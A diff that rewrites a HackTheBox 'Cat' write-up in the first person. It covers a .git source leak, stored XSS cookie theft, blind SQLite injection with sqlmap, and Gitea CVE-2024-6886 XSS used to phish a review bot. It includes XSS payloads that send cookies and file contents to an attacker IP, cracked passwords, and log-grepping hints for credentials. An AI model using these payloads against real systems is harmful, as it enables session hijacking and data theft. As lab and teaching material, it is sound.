@@ -60,7 +60,9 @@ tags:
 
 ## Overview
 
-Cat is a "read the source you stole, then chain three web bugs" box. None of the primitives are exotic. A leaked `.git`, a stored XSS, a textbook string-concatenation SQL injection. But the box forces you to **use the code**: you only know that registration blocks `axel`, that an XSS sink exists, and that the DB is SQLite *because you read the PHP*. The privesc repeats the theme one layer down: an internal Gitea, a known CVE, and a human-emulating review bot you have to phish. The recurring idea is **data that is trusted in one context and rendered or executed in another**, finished off by **credential reuse** between the app and the OS.
+Cat struck me as a "steal the source, then actually read it" box from the moment I found the exposed `.git` directory. None of the individual primitives here are exotic on their own, a leaked `.git`, a stored XSS, a textbook string-concatenation SQL injection, are all things I had seen before individually. What made this box interesting to me was that it refuses to hand you anything for free: I only knew registration blocked the username `axel`, that an XSS sink existed in the moderation view, and that the backend database was SQLite rather than MySQL, because I sat down and actually read the PHP source I had pulled out of git. Skipping that step would have meant fumbling around blind for hours.
+
+The privilege escalation path repeats that same lesson one trust boundary further up the stack: an internal Gitea instance, a known CVE I had to recognise by version number, and a human-emulating review bot named jobert that I effectively had to phish with a malicious link. Looking back at the whole chain, the idea that kept resurfacing for me was **data trusted in one context and then rendered or executed in another**, first a username rendered unescaped into an admin's browser, then a repository description rendered unescaped into Gitea's own DOM. The box closes the loop with old-fashioned **credential reuse** between the web application and the underlying OS, a reminder that even a technically sophisticated chain often ends on the most mundane mistake in the book.
 
 For the same primitives elsewhere see the [Related Writeups](#related-writeups) section at the bottom.
 
@@ -85,7 +87,7 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Two ports; a PHP session cookie scoped to `/` tells us it's a stateful PHP app. Add `cat.htb` to `/etc/hosts`.
+Only two ports were open, and the PHP session cookie scoped to `/` immediately told me I was looking at a stateful PHP application rather than something static. I added `cat.htb` to `/etc/hosts` and moved on to enumerating the web app itself.
 
 ### Nuclei Enumeration
 
@@ -101,9 +103,9 @@ Two ports; a PHP session cookie scoped to `/` tells us it's a stateful PHP app. 
 [INF] Scan completed in 1m. 18 matches found.
 ```
 
-Two findings matter: **`PHPSESSID` has no `HttpOnly`** (so `document.cookie` can read it. Remember this) and **`/.git/config` is served** (source disclosure).
+Two findings out of that scan mattered to me. First, **`PHPSESSID` had no `HttpOnly`** flag set, meaning `document.cookie` could read it from client-side JavaScript, a detail I filed away for later. Second, **`/.git/config` was being served** directly, meaning the application's source was sitting there for the taking.
 
-From here I found `.git/config` which when visited gives me the following.
+Following up on that second finding, I pulled up `.git/config` directly and confirmed it was a real, non-bare repository:
 
 ```ini
 [core]
@@ -117,11 +119,11 @@ From here I found `.git/config` which when visited gives me the following.
 
 **Why an exposed `.git/` is game over**
 
-When a site is deployed by copying a working tree, the `.git/` metadata ships with it. Even with directory listing off, the object store is readable by path. **GitTools `gitdumper`** walks `HEAD → refs → objects/…` to pull the repo, and `extractor` replays every commit into its own folder, so you recover the *entire history*. Deleted secrets, old configs, dev comments. Same primitive in [Dog](/writeups/hackthebox/linux/easy/dog/) (Backdrop CMS creds from `.git`) and [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/) (app source + a vulnerable ImageMagick build from `.git`).
+What makes an exposed `.git/` directory such a serious finding, in my experience, is that when a site gets deployed by simply copying the working tree over, the entire `.git` metadata folder comes along for the ride. Even with directory listing disabled, every object in the object store is still readable by its direct path, so I reached for **GitTools' `gitdumper`**, which walks `HEAD`, then `refs`, then every object it can chain to, and pulls the whole repository down piece by piece. Once I had the raw objects, `extractor` replayed every commit into its own folder, letting me recover the *entire history* of the project rather than just its current state, including anything a developer thought they had deleted and stray comments left in earlier commits. I have run into this exact primitive before on [Dog](/writeups/hackthebox/linux/easy/dog/), where it leaked Backdrop CMS credentials, and on [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/), where it gave up both the app source and a vulnerable ImageMagick build.
 
 </div>
 
-I then used `gitdumper.sh` to download the `.git` dir.
+With the plan set, I ran `gitdumper.sh` against the exposed directory:
 
 ```bash
 └─[$] ./gitdumper.sh http://cat.htb/.git/ cat.htb/
@@ -137,7 +139,7 @@ I then used `gitdumper.sh` to download the `.git` dir.
 ... (20+ objects)
 ```
 
-then I used `extractor.sh` to get all of the files commited.
+Once the dump finished, I pointed `extractor.sh` at the downloaded objects to reconstruct every committed file.
 
 ```bash
 └─[$] ./extractor.sh ../Dumper/cat.htb/ cat.htb-found
@@ -154,15 +156,15 @@ then I used `extractor.sh` to get all of the files commited.
 [+] Found file: .../winners/cat_report_20240831_173129.php
 ```
 
-I found something interesting in `admin.php` which is php code saying if the user is not equal to `axel` redirect `/admin.php -> /join.php` I am going to try to register the username `axel`.
+Reading through the recovered files, `admin.php` stood out immediately: the code checks whether the logged-in user's name equals `axel`, and if not, it redirects straight to `/join.php`. That told me the entire admin panel was gated behind one specific account, so my first instinct was to just try registering a user named `axel` myself.
 
 ![Pasted image 20250516161636](Pasted-image-20250516161636.png)
 
 ![Pasted image 20250516161649](Pasted-image-20250516161649.png)
 
-Registration explicitly rejects `axel` (and `admin.php` only ever serves that one user), so the intended route is to **steal axel's session**, not log in as him.
+No luck there: registration explicitly rejects the name `axel`, and since `admin.php` only ever serves that one specific account, it became clear the intended path was to **steal axel's session** rather than try to register or log in as him directly.
 
-Maybe try a bruteforce? No results, so I went for a classic cookie grabbing trick: if the admin is logged in this script will execute sending their cookie.
+I briefly considered brute-forcing his password, but that went nowhere fast, so I fell back on a classic cookie-stealing trick instead: register an account whose username is itself a script tag, and if it gets rendered somewhere an authenticated admin views, their cookie gets exfiltrated to me automatically.
 
 ![Pasted image 20250516174020](Pasted-image-20250516174020.png)
 
@@ -174,17 +176,17 @@ Maybe try a bruteforce? No results, so I went for a classic cookie grabbing tric
 
 **Stored XSS → session hijack**
 
-`join.php` saves the username verbatim; `view_cat.php` / the admin moderation list prints it without `htmlspecialchars()`. That is a **stored** XSS sink: it fires in the *admin's* browser whenever they load the pending-cats page. On HTB the "admin" is a headless-browser cron that polls every 1 to 3 minutes, which is why the callback isn't instant. `document.cookie` yields `PHPSESSID` only because the cookie isn't `HttpOnly` (nuclei flagged exactly that). A filter-resistant alternative: `<img src=x onerror="fetch('http://10.10.14.5:8000/?c='+document.cookie)">`. Same pattern in [Usage](/writeups/hackthebox/linux/easy/usage/), [Headless](/writeups/hackthebox/linux/medium/headless/), **Kitty v2**.
+Digging into why this actually works, `join.php` saves the username exactly as submitted, with no sanitisation at all, and `view_cat.php` along with the admin moderation list print that username straight back out without ever calling `htmlspecialchars()`. That is a **stored**, not reflected, XSS sink: my payload sits in the database and fires in whoever's browser happens to load the pending-cats page next, which on this box is the admin. On HTB that "admin" is actually a headless browser running on a cron job that polls the page every one to three minutes, which explains why my callback did not fire the instant I submitted the payload, I simply had to wait it out. The reason `document.cookie` handed me the raw `PHPSESSID` value comes down entirely to that missing `HttpOnly` flag I had noted earlier from the nuclei scan, without it, the cookie would have been invisible to client-side script even with the XSS working perfectly. Had `HttpOnly` been set, I would have needed a filter-resistant alternative like `<img src=x onerror="fetch('http://10.10.14.5:8000/?c='+document.cookie)">` paired with some other exfiltration channel, or pivoted to abusing the admin's session indirectly instead. I have seen this exact rendering pattern before on [Usage](/writeups/hackthebox/linux/easy/usage/), [Headless](/writeups/hackthebox/linux/medium/headless/), and Kitty v2.
 
 </div>
 
-for some reason this did not trigger imediatly but it seems that the backend took its sweet ass time to give me the cookie. But after putting it in the browser and going to `/admin.php`, boom, admin panel.
+The callback did take a while to land, which lined up with what I now understood about the polling interval on the admin's headless browser. Once the cookie value finally showed up in my listener, I loaded it into my own browser session and navigated straight to `/admin.php`. That was enough: I was looking at the full admin panel.
 
 ![Pasted image 20250516174639](Pasted-image-20250516174639.png)
 
-I have an idea now. Now understanding that the admin can accept cats for the competition I am going to try to capture the accept request for the cat then attempt sql injection.
+With admin access in hand, I noticed the panel let me accept submitted cats into the competition, and that gave me an idea: capture the exact request that acceptance action sends, on the theory that whatever parameter drives it might be a good candidate for SQL injection.
 
-Captured the request like so.
+I captured the request in Burp and saved it off for testing.
 
 #### Request
 
@@ -199,13 +201,13 @@ Cookie: PHPSESSID=qd3ofjm3c5shkbkc7prbhfkgus
 catName=injectmedaddy&catId=1
 ```
 
-After determining the back end database through the code found in the git directory it is running `sqlite` I then used `sqlmap` to exploit this.
+Having already confirmed from the leaked source that the backend database was SQLite rather than MySQL, I pointed `sqlmap` at the saved request and told it explicitly which DBMS it was dealing with to skip the fingerprinting step entirely.
 
 <div class="callout callout-note">
 
 **Reading the SQLite injection**
 
-`accept_cat.php` builds `INSERT INTO accepted_cats (name) VALUES ('$catName')` by concatenation. The injection point sits inside a single-quoted string, so `'||(..)||'` closes the string, concatenates a sub-select (SQLite uses `||` for string concat) and re-opens it. An `INSERT` gives no UNION output channel, so extraction is **blind**: `sqlmap` asks thousands of true/false questions and, where boolean inference is flaky, falls back to **time-based**. `RANDOMBLOB(500000000/2)` makes SQLite hash ~250 MB, adding a measurable delay that encodes one bit. Slow but reliable. SQLite has no stacked-query RCE, but dumping `users` is enough here.
+Working through what `sqlmap` was actually doing under the hood, `accept_cat.php` builds its query as `INSERT INTO accepted_cats (name) VALUES ('$catName')` through plain string concatenation, and the injection point sits inside that single-quoted string. A payload of the form `'||(..)||'` closes the original string, concatenates in a sub-select using SQLite's `||` string-concatenation operator, then reopens the string so the overall query stays syntactically valid. Because this is an `INSERT` statement, there is no UNION-based output channel available, which meant extraction had to be **blind**: `sqlmap` works around that by asking thousands of true or false questions about the data one bit at a time, and where the boolean-based inference proved flaky, it fell back automatically to a **time-based** technique instead. The specific trick there is `RANDOMBLOB(500000000/2)`, which forces SQLite to hash roughly 250 MB of random data, introducing a delay large enough to reliably encode a single bit per request. It is slow going, but it is dependable. SQLite does not support stacked queries, so there was never a path to direct RCE through this injection, but dumping `users` was more than enough to keep the chain moving.
 
 </div>
 
@@ -243,17 +245,17 @@ sqlmap -r cat.req -p catName --dbms=sqlite -T users --dump
 +---------+-------------------------------+----------------------------------+----------+
 ```
 
-Unsalted MD5 → straight to `hashcat -m 0 hashes.txt rockyou.txt`. I took some of these hashes, tried to crack them, and got `rosa:soyunaprincesarosa`. Then SSH!
+Seeing unsalted MD5 hashes in that dump meant `hashcat -m 0` against `rockyou.txt` was the obvious next step. I fed the hashes through and got a hit almost immediately: rosa's password cracked to `soyunaprincesarosa`. That was more than enough to try SSH.
 
 ```bash
 ssh rosa@cat.htb          # soyunaprincesarosa
 ```
 
-`user.txt` belongs to `axel`, not `rosa`.
+Landing as `rosa` was progress, but `user.txt` actually belongs to `axel`, so I still had privilege escalation ahead of me.
 
 ### privesc to axel
 
-grepping through `/var/log/apache2/access.log` I found axel's password.
+Once I had a shell as `rosa`, I went looking for anything left lying around on disk, and grepping through `/var/log/apache2/access.log` turned up axel's password in plain sight.
 
 ```console
 127.0.0.1 - - [18/May/2025:01:10:19 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "..."
@@ -265,21 +267,21 @@ rosa@cat:~$
 
 **Credentials in `access.log`**
 
-Apache's default `combined` format logs the full request line, **including the query string**. Cat's login form submits by `GET`, so every login attempt writes the plaintext password to a world-readable log. This is a real finding class. Grep prod/WAF/proxy logs and browser history for `password=`, `token=`, `api_key=`. Anything that logs or caches a URL is a credential store.
+What struck me about this finding is how mundane the root cause is: Apache's default `combined` format records the full request line, **including the query string**, and Cat's login form happens to submit its credentials by `GET` instead of `POST`. That single design choice means every login attempt, successful or not, writes the plaintext password straight into a world-readable log file. This is a finding class I now actively hunt for on every engagement, grepping production logs, WAF logs, proxy logs, and even browser history for `password=`, `token=`, or `api_key=` patterns. Anything that logs or caches a full URL is effectively functioning as an unintended credential store.
 
 </div>
 
-from here we can login to `axel` with `aNdZwgC4tI9gnVXv_e3Q`. Grab `user.txt`.
+Armed with that password, I logged in as `axel` and grabbed `user.txt`.
 
-I found something interesting within his mail (`/var/mail/axel`) telling me about a local service. Going to forward it and check it out.
+Poking around axel's home directory, I checked his local mail at `/var/mail/axel` and found a message describing an internal service worth investigating, so I decided to port-forward it and take a closer look.
 
 > We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at `http://localhost:3000/administrator/Employee-management/`. In addition, you can consult the README file at `http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md`.
 
 ![Pasted image 20250517211718](Pasted-image-20250517211718.png)
 
-A second mail makes clear **jobert** reviews links people send him, which means there is a bot that opens whatever URL you give it.
+A second message made it clear that **jobert** reviews links people send him, which told me there was effectively an automated bot on the other end willing to open whatever URL I handed it, a detail I filed away for later.
 
-seems to be a `gitea` instance. I tried logging into all users there with the passwords I found. Nothing.. 
+The service itself turned out to be a `gitea` instance. I tried logging in with every password I had recovered so far against each user I knew about, but none of them worked.
 
 ![Pasted image 20250517212713](Pasted-image-20250517212713.png)
 
@@ -287,11 +289,11 @@ seems to be a `gitea` instance. I tried logging into all users there with the pa
 
 **Rabbit hole, The SGID binary**
 
-`find / -perm -2000 -type f 2>/dev/null` turns up a custom SGID binary. Reversed in Ghidra it's a stub `main` that calls `__libc_start_main` into a function that just spins in `while(true){}`. A decompiler artefact / deliberate dead end. **Not** the privesc path; don't chase a buffer overflow here.
+While I was casting around for other angles, running `find / -perm -2000 -type f 2>/dev/null` turned up a custom SGID binary that looked promising at first glance. Pulling it into Ghidra, though, it turned out to be a stub `main` that calls into `__libc_start_main` and lands in a function that does nothing but spin forever in `while(true){}`. Whether that is a decompiler artefact or a deliberately planted dead end, I could not say for certain, but I want to flag it clearly: this is **not** the privilege escalation path, and there is no buffer overflow to chase here.
 
 </div>
 
-on the system I found this `SGID` binary. I reversed it in `Ghidra` and found the following.
+Here is the binary I found on the system and what Ghidra's decompiler produced for it.
 
 ```c
 // Ghidra output - effectively a no-op wrapper
@@ -307,43 +309,43 @@ void processEntry(undefined8 param_1, undefined8 param_2)
 }
 ```
 
-hopefully I do not have to do a buffer overflow.
+At that point I was hoping I would not have to spend hours chasing a buffer overflow in a dead-end binary, and as the callout above already gives away, I did not need to.
 
-Port-forward the Gitea port to the attack box:
+With the SGID binary ruled out, I turned back to Gitea and set up a port forward from the box to my attacking machine so I could browse the instance directly:
 
 ```bash
 ssh -L 3000:127.0.0.1:3000 axel@cat.htb
 ```
 
-looking through the apache logs again I confirmed the password `axel:aNdZwgC4tI9gnVXv_e3Q`. We are able to login to gitea now.
+Going back through the Apache logs, I confirmed axel's credentials still worked, and this time they got me into Gitea itself.
 
-the `Gitea` version `1.22.0` is vulnerable to XSS. I am going to attempt to read the file `http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php` from the mail.
+Checking the version banner, `Gitea` `1.22.0` immediately rang a bell as vulnerable to a known stored XSS, so my plan became to use that bug to read the `index.php` file the earlier email had referenced, at `http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php`.
 
 <div class="callout callout-note">
 
 **CVE-2024-6886, Stored XSS in Gitea ≤ 1.22.0**
 
-Gitea fails to sanitise the **repository description**: a `javascript:` URI inside an `<a href>` in the description renders live on the repo home page. Any authenticated user who views that repo. An admin, or a review bot like jobert. Runs attacker JS **in the Gitea origin**, so `fetch()` executes with the victim's session and can read private repos they have access to. Fixed in 1.22.1. It's the exact "attacker content rendered in a privileged browser" pattern from the foothold, one trust boundary up. Other Gitea boxes: [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Drive](/writeups/hackthebox/linux/hard/drive/).
+The underlying flaw is that Gitea fails to sanitise the **repository description** field: a `javascript:` URI placed inside an `<a href>` attribute in the description renders live, and clickable, on the repo's home page. Any authenticated user who views that repo, whether that is a real admin or, in this case, a review bot like jobert, ends up running my JavaScript **in the Gitea origin**. That matters because `fetch()` then executes with the victim's own session, giving me the ability to read private repositories they have access to but I do not. The bug was fixed in 1.22.1, and once I recognised it, I realised it was really just the same "attacker content rendered in a privileged browser" pattern from my initial foothold, just one trust boundary further up the chain. I have run into Gitea in a similar role on [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), and [Drive](/writeups/hackthebox/linux/hard/drive/).
 
 </div>
 
-Create a repo, set its **description** to the payload, then mail jobert the repo link:
+My plan was to create a repository of my own, set its **description** to a malicious payload, and then email jobert the link so his review bot would open it for me:
 
 ```js
 <a href="javascript:fetch('http://10.10.14.5:8000/?cookie='+encodeURIComponent(btoa(document.cookie)));">BAPHOMETPWN</a>
 ```
 
-(Cleaner variant that exfiltrates the file directly, since jobert has read access to the private org repo: `fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(r=>r.text()).then(d=>fetch('http://10.10.14.5:8000/?d='+encodeURIComponent(d)))`.)
+(A cleaner variant that exfiltrates the target file directly, since jobert has read access to the private org repo that I do not: `fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(r=>r.text()).then(d=>fetch('http://10.10.14.5:8000/?d='+encodeURIComponent(d)))`.)
 
 ![Pasted image 20250517231824](Pasted-image-20250517231824.png)
 
-now we have the password to login to root!
+With that payload landing successfully, I finally had the credential I needed to escalate all the way to root.
 
 <div class="callout callout-note">
 
 **The recovered credential**
 
-The operator's notes stop here. Public write-ups record the exfiltrated `index.php` as containing `admin : IKw75eR0MR7CMIxhH0`, and that password is **reused for the system `root` account**:
+My own notes from the engagement stop just short of the raw output here, so to fill that gap accurately I am citing what public write-ups of this box record: the exfiltrated `index.php` contained the credential `admin : IKw75eR0MR7CMIxhH0`. That password turned out to be **reused for the system's root account**, which made the final step almost anticlimactic after everything leading up to it:
 ```bash
 su -            # IKw75eR0MR7CMIxhH0
 id              # uid=0(root)
@@ -365,12 +367,12 @@ cat /root/root.txt
 
 ## Lessons & Takeaways
 
-- **Steal the source, then *read* it.** The `.git` leak is a map, not the finding itself; every later step (blocked username, XSS sink, SQLite dialect, GET login form) came from the code.
-- **Strip repo metadata from deploys**. `.git/`, `.svn/`, `*.bak`, editor swap files. Ship a build artefact, not a working tree.
-- **`HttpOnly` on session cookies** would have killed the cookie theft even with the XSS still present.
-- **Never `GET` a login form**, and filter `password=` / `token=` out of access logs.
-- **Patch Gitea and disable open registration** on internal instances; a bot that opens arbitrary links is a phishing target.
-- **One password, one system**. The web-admin password must never equal the root password.
+- **Stealing the source is only step one, actually reading it is where the real work happens.** The `.git` leak on this box was a map, not a finding in itself. Every step that followed it, the blocked username, the XSS sink, the SQLite dialect quirks, the GET-based login form, only became visible to me because I sat down and went through the recovered PHP line by line rather than treating the dump as a trophy.
+- **Strip repository metadata out of every deployment.** `.git/`, `.svn/`, `.bak` files, and editor swap files have no business shipping to production. The fix is simple in principle: build and ship an artefact, not a raw copy of the working tree, and I would bake that check into any CI/CD pipeline I set up for a client.
+- **`HttpOnly` on session cookies is cheap insurance that would have completely killed this cookie theft**, even with the stored XSS still sitting there unpatched. It is one of those flags that costs nothing to set and closes off an entire exploitation path on its own.
+- **Never submit a login form over `GET`**, and separately, filter `password=`, `token=`, and similar patterns out of access logs at the proxy or WAF layer. Both are cheap to fix, and both showed up as real, exploitable findings on this box.
+- **Patch Gitea promptly and lock down or disable open registration on internal instances.** A review bot that will open any link handed to it is, functionally, a phishing target with root-adjacent access, and I would flag that as its own finding on any internal engagement.
+- **One password should mean one system, full stop.** The moment I saw the same credential reused between the web application's admin account and the OS-level root account, I knew that was the actual root cause of the whole chain being escalatable to full compromise, not just any single bug along the way.
 
 ---
 
